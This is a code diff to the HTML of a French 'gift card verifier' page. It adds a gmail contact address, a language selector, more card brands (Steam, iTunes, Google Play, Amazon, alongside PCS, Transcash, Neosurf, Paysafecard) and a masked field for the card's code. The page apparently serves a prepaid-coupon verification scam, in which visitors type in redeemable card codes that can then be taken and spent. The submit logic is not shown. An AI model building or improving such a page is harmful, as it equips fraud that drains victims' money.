@@ -9,7 +9,6 @@
     <link rel="preconnect" href="https://cdnjs.cloudflare.com">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
-    <!-- Fallback styles pour JavaScript désactivé -->
     <noscript>
         <style>
             body:not(.js-ok) .hero,
@@ -39,7 +38,7 @@
     </noscript>
 </head>
 <body>
-    <header class="header">
+    <header class="header" id="mainHeader">
         <div class="container">
             <div class="header-inner">
                 <div class="logo-wrap">
@@ -52,17 +51,23 @@
                 </div>
 
                 <div class="header-actions">
+                    <!-- Bouton Contact mailto -->
+                    <a href="mailto:giftcardverifierr@gmail.com" class="contact-btn header-contact-btn" aria-label="Nous contacter par email" title="Nous contacter">
+                        <i class="fas fa-envelope"></i>
+                        <span class="contact-btn-label" data-i18n="contact.btn">Contact</span>
+                    </a>
+
                     <button type="button" class="theme-toggle" id="themeToggle" aria-label="Activer le mode sombre" title="Mode sombre">
                         <i class="fas fa-moon"></i>
                     </button>
 
-                    <div class="language-selector" aria-label="Sélecteur de langue">
-                        <button class="lang-btn active" data-lang="fr" type="button">
-                            <i class="fas fa-flag"></i> FR
-                        </button>
-                        <button class="lang-btn" data-lang="en" type="button">
-                            <i class="fas fa-flag"></i> EN
-                        </button>
+                    <div class="language-selector">
+                        <select id="langSelect" class="lang-select" aria-label="Sélecteur de langue">
+                            <option value="fr">🇫🇷 Français</option>
+                            <option value="en">🇬🇧 English</option>
+                            <option value="de">🇩🇪 Deutsch</option>
+                            <option value="es">🇪🇸 Español</option>
+                        </select>
                     </div>
                 </div>
             </div>
@@ -85,7 +90,6 @@
         <section class="main-form">
             <div class="container form-layout">
                 <div class="form-card glass-panel animate-in">
-                    <!-- Message pour JavaScript désactivé -->
                     <div class="no-js-message" style="display:none;">
                         <i class="fas fa-info-circle"></i>
                         <span data-i18n="noscript.message">Certaines fonctionnalités interactives nécessitent JavaScript. Le formulaire reste utilisable, mais la validation en temps réel est désactivée.</span>
@@ -104,21 +108,23 @@
                             </div>
 
                             <div class="card-selector-shell">
-                                <!-- Sélecteur de carte unifié (mobile + desktop) -->
                                 <div class="custom-select-wrapper" id="cardSelectWrapper">
                                     <select id="cardTypeSelect" class="card-select" aria-label="Type de carte">
                                         <option value="" data-i18n="form.selectPlaceholder">-- Choisissez une carte --</option>
-                                        <option value="PCS">PCS</option>
-                                        <option value="Transcash">Transcash</option>
-                                        <option value="Neosurf">Neosurf</option>
-                                        <option value="Paysafecard">Paysafecard</option>
+                                        <option value="PCS" data-logo="pcs">PCS</option>
+                                        <option value="Transcash" data-logo="transcash">Transcash</option>
+                                        <option value="Neosurf" data-logo="neosurf">Neosurf</option>
+                                        <option value="Paysafecard" data-logo="paysafe">Paysafecard</option>
+                                        <option value="iTunes" data-logo="itunes">iTunes</option>
+                                        <option value="Steam" data-logo="steam">Steam Card</option>
+                                        <option value="GooglePlay" data-logo="googleplay">Google Play</option>
+                                        <option value="Amazon" data-logo="amazon">Amazon Card</option>
                                     </select>
                                     <div class="select-arrow" aria-hidden="true">
                                         <i class="fas fa-chevron-down"></i>
                                     </div>
                                 </div>
 
-                                <!-- Prévisualisation de la carte sélectionnée -->
                                 <div class="card-preview" id="cardPreview">
                                     <div class="card-preview-inner">
                                         <div class="card-preview-logo" id="cardPreviewLogo">
@@ -141,9 +147,12 @@
                                 <label for="pin" id="pinLabel" data-i18n="form.pin">Code</label>
                                 <span class="field-note" id="pinMetaHint" data-i18n="form.pinMetaDefault">Le format dépend de la carte choisie</span>
                             </div>
-                            <div class="input-with-icon" id="pinFieldWrap">
+                            <div class="input-with-icon pin-wrapper" id="pinFieldWrap">
                                 <i class="fas fa-key"></i>
-                                <input type="text" id="pin" autocomplete="off" spellcheck="false" placeholder="Sélectionnez une carte d'abord" required>
+                                <input type="password" id="pin" autocomplete="off" spellcheck="false" placeholder="Sélectionnez une carte d'abord" required>
+                                <button type="button" class="pin-toggle" id="pinToggle" aria-label="Afficher le code">
+                                    <i class="fas fa-eye"></i>
+                                </button>
                             </div>
                             <small id="pinHelp" data-i18n="form.pinHelpDefault">Choisissez une carte pour charger le bon format.</small>
                             <div class="error-message" id="pinError" aria-live="polite"></div>
@@ -205,6 +214,10 @@
                     </div>
                 </div>
                 <div class="footer-links">
+                    <a href="mailto:giftcardverifierr@gmail.com" class="contact-btn footer-contact-btn">
+                        <i class="fas fa-envelope"></i>
+                        <span data-i18n="contact.btn">Contactez-nous</span>
+                    </a>
                     <a href="#" data-i18n="footer.privacy">Politique de confidentialité</a>
                     <a href="#" data-i18n="footer.terms">Conditions d'utilisation</a>
                 </div>
